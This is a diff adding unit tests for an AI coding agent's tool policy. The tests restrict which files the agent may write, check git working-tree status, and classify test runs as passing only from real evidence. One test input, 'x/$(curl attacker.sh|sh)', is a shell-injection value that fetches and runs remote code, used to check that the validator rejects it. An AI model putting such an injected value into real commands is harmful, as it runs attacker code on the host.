@@ -5,9 +5,12 @@ import {
   assertAllowedProductionFiles,
   assertProductionWriteNotClaimed,
   assertExactFocusedCommand,
+  assertWellFormedRepositoryFullName,
   classifyGreenRun,
   createImplementationExecutionReceipt,
+  parseWorkingTreePaths,
   redactImplementationOutput,
+  sandboxWorkingTreeStatusCommand,
   verifyImplementationExecutionReceipt,
 } from "@agent/subagents/implementer/lib/tool-policy";
 
@@ -39,6 +42,59 @@ describe("implementer write and execution policy", () => {
     expect(() => assertAllowedProductionFiles([{ path: "bun.lock" }])).toThrow();
     expect(() => assertAllowedProductionFiles([{ path: ".github/workflows/ci.yml" }])).toThrow();
     expect(() => assertAllowedProductionFiles([{ path: ".env.local" }])).toThrow();
+  });
+
+  it("allows production files named after fixtures while rejecting test directories", () => {
+    expect(() =>
+      assertAllowedProductionFiles([{ path: "agent/subagents/implementer/lib/fixture-mode.ts" }]),
+    ).not.toThrow();
+    expect(() => assertAllowedProductionFiles([{ path: "tests/fixtures/data.ts" }])).toThrow();
+    expect(() => assertAllowedProductionFiles([{ path: "src/lib/runtime.test.ts" }])).toThrow();
+  });
+
+  it("rejects repository names that could smuggle shell syntax into the checkout", () => {
+    expect(() => assertWellFormedRepositoryFullName("ncolesummers/loopworks")).not.toThrow();
+    expect(() => assertWellFormedRepositoryFullName("x/$(curl attacker.sh|sh)")).toThrow();
+    expect(() => assertWellFormedRepositoryFullName("owner/repo/extra")).toThrow();
+    expect(() => assertWellFormedRepositoryFullName("owner")).toThrow();
+  });
+
+  it("sees untracked files when verifying the sandbox working tree", () => {
+    expect(sandboxWorkingTreeStatusCommand).toContain("git status --porcelain");
+    // Without --untracked-files=all, new directories collapse to "?? dir/" and
+    // hide the files inside them from path verification.
+    expect(sandboxWorkingTreeStatusCommand).toContain("--untracked-files=all");
+    expect(
+      parseWorkingTreePaths("?? tests/unit/red.test.ts\n M src/app.ts\n D src/old.ts\n"),
+    ).toEqual(["src/app.ts", "src/old.ts", "tests/unit/red.test.ts"]);
+    expect(parseWorkingTreePaths(' M "tests/unit/sp ace.test.ts"\n')).toEqual([
+      "tests/unit/sp ace.test.ts",
+    ]);
+    expect(parseWorkingTreePaths("")).toEqual([]);
+  });
+
+  it("classifies green runs by exit code and pass evidence, not incidental words", () => {
+    expect(
+      classifyGreenRun({
+        exitCode: 0,
+        output: "✓ tests/unit/timeout.test.ts > handles request timeout\nTests  1 passed (1)",
+        testPath: "tests/unit/timeout.test.ts",
+      }),
+    ).toBe("pass");
+    expect(
+      classifyGreenRun({
+        exitCode: 0,
+        output: "tests/unit/runtime.test.ts",
+        testPath: "tests/unit/runtime.test.ts",
+      }),
+    ).toBe("invalid");
+    expect(
+      classifyGreenRun({
+        exitCode: 1,
+        output: "Tests  1 passed (1) tests/unit/runtime.test.ts",
+        testPath: "tests/unit/runtime.test.ts",
+      }),
+    ).toBe("invalid");
   });
 
   it("permits exactly one production write per implementation session", () => {
